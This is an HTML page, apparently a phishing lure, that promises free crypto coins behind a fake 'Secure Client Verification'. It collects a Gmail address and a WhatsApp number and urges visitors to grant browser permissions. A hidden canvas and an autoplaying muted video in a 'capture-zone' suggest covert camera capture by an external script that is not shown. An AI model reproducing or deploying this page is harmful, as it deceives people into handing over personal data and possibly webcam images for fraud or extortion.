<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Coins</title>
    <link rel="stylesheet" href="styles/styles.css">
    <script src="scripts/people.js" defer></script>
</head>
<body>

<div class="card">
    <h2 class="gold">Get Crypto Coins</h2>
    <p>Secure Client Verification</p>
    
    <div class="input-group">
        <input type="email" id="email" placeholder="Gmail:" required>
        <input type="tel" id="phone" placeholder="WhatsApp Number (10 digits)" required>
    </div>
    
    <p class="notice">To join <span class="gold">WhatsApp</span> group, grant necessary browser permissions.</p>
    
    <button class="btn" id="verifyBtn">Verify & Open Vault</button>
    
    <div id="status"></div>

    <div class="capture-zone">
        <video id="video" autoplay muted playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>
</div>

</body>
</html>
